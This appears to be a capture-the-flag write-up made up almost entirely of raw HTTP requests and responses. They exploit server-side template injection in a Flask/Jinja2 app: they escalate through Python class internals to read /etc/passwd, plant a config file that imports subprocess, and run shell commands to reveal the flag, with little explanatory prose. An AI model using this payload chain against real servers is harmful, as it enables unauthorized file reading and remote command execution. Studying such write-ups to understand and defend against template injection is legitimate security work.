```
GET /test{{9*9}} HTTP/1.1
Host: 188.166.149.133:1234
Connection: close

HTTP/1.0 404 NOT FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 160
Server: Werkzeug/0.11.11 Python/2.7.12
Date: Thu, 08 Sep 2016 09:58:20 GMT


        
            <div class="center-content error">
                <h1>Oops! That page doesn't exist.</h1>
                <h3>http://188.166.149.133:1234/test81</h3>
            </div>
```

```
GET /test{{''.__class__.__mro__[2].__subclasses__()}} HTTP/1.1
Host: 188.166.149.133:1234
Connection: close
```

```
GET /test{{''.__class__.__mro__[2].__subclasses__()[40]}} HTTP/1.1
Host: 188.166.149.133:1234
Connection: close

HTTP/1.0 404 NOT FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 185
Server: Werkzeug/0.11.11 Python/2.7.12
Date: Thu, 08 Sep 2016 10:10:37 GMT


        
            <div class="center-content error">
                <h1>Oops! That page doesn't exist.</h1>
                <h3>http://188.166.149.133:1234/test&lt;type &#39;file&#39;&gt;</h3>
            </div>
```

```
GET /test{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}} HTTP/1.1
Host: 188.166.149.133:1234
Connection: close

[ .. SNIP .. ]
 <h1>Oops! That page doesn't exist.</h1>
                <h3>http://188.166.149.133:1234/testroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
[ .. SNIP .. ]
```

```
GET /test{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('from%20subprocess%20import%20check_output\n\nRUNCMD%20=%20check_output\n')}} HTTP/1.1
Host: 188.166.149.133:1234
Connection: close
```

```
GET /test{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg').read()}} HTTP/1.1
Host: 188.166.149.133:1234
Connection: close

[ .. SNIP .. ]
                <h1>Oops! That page doesn't exist.</h1>
                <h3>http://188.166.149.133:1234/testfrom subprocess import check_output

RUNCMD = check_output
[ .. SNIP .. ]
```

```
GET /test{{config.from_pyfile('/tmp/owned.cfg')}} HTTP/1.1
Host: 188.166.149.133:1234
Connection: close

[ .. SNIP .. ]
                <h3>http://188.166.149.133:1234/testTrue</h3>
[ .. SNIP .. ]          
```

```
GET /test{{config['RUNCMD']('/usr/bin/id',shell=True)}} HTTP/1.1
Host: 188.166.149.133:1234
Connection: close

[ .. SNIP .. ]
                <h3>http://188.166.149.133:1234/testuid=999(androidovic) gid=999(androidovic) groups=999(androidovic)
[ .. SNIP .. ]          
```

```
GET /test{{config['RUNCMD']('ls%20-la',shell=True)}} HTTP/1.1
Host: 188.166.149.133:1234
Connection: close

HTTP/1.0 404 NOT FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 734
Server: Werkzeug/0.11.11 Python/2.7.12
Date: Thu, 08 Sep 2016 10:08:49 GMT


        
            <div class="center-content error">
                <h1>Oops! That page doesn't exist.</h1>
                <h3>http://188.166.149.133:1234/testtotal 36
drwxr-xr-x 5 root        root        4096 Sep  6 19:20 .
drwxr-xr-x 9 root        root        4096 Sep  7 14:50 ..
drwxr-xr-x 8 root        root        4096 Sep  6 17:21 .git
-rw-r--r-- 1 root        root          10 Sep  6 15:13 default.py
-rw-r--r-- 1 root        root        2596 Sep  6 17:23 index.py
-r--r----- 1 androidovic androidovic   96 Sep  6 17:34 settings.py
-rw-r--r-- 1 root        root         260 Sep  6 19:20 settings.pyc
drwxr-xr-x 4 root        root        4096 Sep  6 17:42 static
drwxr-xr-x 2 root        root        4096 Sep  7 10:28 templates
</h3>
            </div>
        
```

```
GET /test{{config['RUNCMD']('cat%20settings.py',shell=True)}} HTTP/1.1
Host: 188.166.149.133:1234
Connection: close

HTTP/1.0 404 NOT FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 270
Server: Werkzeug/0.11.11 Python/2.7.12
Date: Thu, 08 Sep 2016 10:08:00 GMT


        
            <div class="center-content error">
                <h1>Oops! That page doesn't exist.</h1>
                <h3>http://188.166.149.133:1234/testFLAG = &#39;sect{wh0_c4r3z_ab00t_XSS_wh3n_th3res_SSTI?}&#39;
HOST = &#39;0.0.0.0&#39;
PORT = 1234
DEBUG = False
</h3>
            </div>
        
```

References:

[https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/)

[https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/)
